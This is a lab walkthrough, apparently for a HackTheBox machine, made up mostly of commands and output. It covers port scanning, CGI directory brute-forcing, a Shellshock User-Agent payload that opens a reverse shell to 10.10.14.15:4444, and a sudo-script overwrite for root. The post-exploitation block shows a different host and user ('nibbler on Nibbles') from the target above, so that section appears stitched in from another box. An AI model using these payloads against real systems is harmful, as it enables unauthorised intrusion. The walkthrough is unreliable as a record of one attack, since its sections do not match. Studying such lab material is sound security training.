## Nmap Port Scanning
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap 10.10.10.56 -T4 -sV -Pn -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 22:21 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 15.06% done; ETC: 22:21 (0:00:17 remaining)
Nmap scan report for 10.10.10.56
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.92 secondssear

```
#### 80/tcp  http  Apache httpd 2.4.18 ((Ubuntu))
- <mark>Directory Brute-Forcing</mark>
	```bash
	# Found /cgi-bin directory and try to brute-force files to use for shellshock
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt 
	===============================================================
	Gobuster v3.5
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.10.56
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.5
	[+] Timeout:                 10s
	===============================================================
	2023/08/29 23:15:32 Starting gobuster in directory enumeration mode
	===============================================================
	/.hta                 (Status: 403) [Size: 290]
	/.htaccess            (Status: 403) [Size: 295]
	/.htpasswd            (Status: 403) [Size: 295]
	/cgi-bin/             (Status: 403) [Size: 294]
	/index.html           (Status: 200) [Size: 137]
	/server-status        (Status: 403) [Size: 299]
	Progress: 4480 / 4615 (97.07%)
	===============================================================
	2023/08/29 23:15:43 Finished
	===============================================================
	```
	
	```bash
	#brute-force file with .sh extension under /cgi-bin directory 
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -r -x .sh                                                                 
	===============================================================
	Gobuster v3.5
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.10.56/cgi-bin
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.5
	[+] Extensions:              sh
	[+] Follow Redirect:         true
	[+] Timeout:                 10s
	===============================================================
	2023/08/29 23:00:24 Starting gobuster in directory enumeration mode
	===============================================================
	/user.sh              (Status: 200) [Size: 119]
	Progress: 163191 / 163288 (99.94%)
	===============================================================                
```
- <mark>Exploitation</mark>
	- Use burpsuite to intercept HTTP request to /cgi-bin/user.sh and send to the reapter![[Pasted image 20230829232807.png]]
	- inject malicious code at `User-Agent` header to test for shellshock 
	```bash
	User-Agent:() { :;};echo -e "\r\nHello"
	```
	- inject malicious code at `User-Agent` header to exploit for shellshock and get reverse shell
	```bash
	User-Agent:() { :;};/bin/bash -i >& /dev/tcp/10.10.14.15/4444 0>& 1
	```
- <mark>Post-Exploitation</mark>'
```bash
#misconfigured SUDO permission
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
#Overwrite /home/nibbler/personal/stuff/monitor.sh
echo "bash -i" > /home/nibbler/personal/stuff/monitor.sh
#Escalate
sudo /home/nibbler/personal/stuff/monitor.sh
```